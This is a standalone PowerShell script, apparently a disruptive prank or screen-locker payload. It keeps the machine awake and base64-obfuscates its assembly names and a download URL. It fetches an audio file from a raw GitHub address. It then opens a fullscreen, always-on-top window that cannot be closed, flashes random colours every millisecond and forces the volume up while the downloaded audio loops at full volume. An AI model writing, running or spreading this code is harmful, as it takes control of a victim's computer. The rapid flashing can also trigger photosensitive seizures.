    $execState = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern uint SetThreadExecutionState(uint esFlags);' -Name "SleepUtil" -Namespace "Win32" -PassThru
    $execState::SetThreadExecutionState(0x80000003)

    $formsName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLldpbmRvd3MuRm9ybXM='))
    $drawingName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLkRyYXdpbmc='))
    
    [void][Reflection.Assembly]::LoadWithPartialName($formsName)
    [void][Reflection.Assembly]::LoadWithPartialName($drawingName)

    $mainForm = New-Object System.Windows.Forms.Form
    $mainForm.FormBorderStyle = 'None'
    $mainForm.WindowState = 'Maximized'
    $mainForm.TopMost = $true
    $mainForm.BackColor = [System.Drawing.Color]::Black

    try { 
        $iconPath = "$env:SystemRoot\System32\shell32.dll"
        $mainForm.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconPath) 
    } catch {}

    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VsbGlzMDkwL0VsbGlzLVBvcmplY3QzMjEyNTEyL2QxMDI3YjEwMTFlYTViMGNhZWRkMGZiNDI2MWUzNDAzZWEzZTQ0MzUvc29uZy5tcDM='))
    $tempFilePath = "$env:TEMP\s.mp3"
    
    Start-Job -ScriptBlock { 
        param($url, $dest) 
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
    } -ArgumentList $downloadUrl, $tempFilePath

    $chaosTimer = New-Object System.Windows.Forms.Timer
    $chaosTimer.Interval = 1
    
    $mainForm.Add_FormClosing({
        $_.Cancel = $true
    })

    $chaosTimer.Add_Tick({
        $r = Get-Random -Min 0 -Max 256
        $g = Get-Random -Min 0 -Max 256
        $b = Get-Random -Min 0 -Max 256
        $mainForm.BackColor = [System.Drawing.Color]::FromArgb($r, $g, $b)
        (New-Object -ComObject WScript.Shell).SendKeys([char]175)
    })

    Start-Sleep -Seconds 10 
    
    try {
        $wmp = New-Object -ComObject WMPlayer.OCX
        $wmp.URL = $tempFilePath
        $wmp.settings.setMode("loop", $true)
        $wmp.settings.volume = 100
        $wmp.controls.play()
    } catch {
        if (Test-Path $tempFilePath) { Start-Process $tempFilePath }
    }

    $chaosTimer.Start()
    $mainForm.ShowDialog()
